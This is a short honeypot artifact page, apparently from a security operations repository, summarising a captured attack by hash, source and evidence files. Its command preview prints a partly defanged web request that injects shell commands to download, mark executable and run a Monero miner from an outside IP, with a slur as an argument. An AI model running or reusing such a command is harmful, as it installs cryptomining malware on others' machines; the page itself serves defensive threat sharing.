# b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `b56c539869fdf0eaae6831b7f05050b50f36e466d5a8bbec36600e0d17673a99` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+arm+arm7;wget+http:/\/31[.]56[.]209[.]XXX/monero.arm7;chmod+777+monero.arm7;./monero.arm7+jews;wget+http:
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
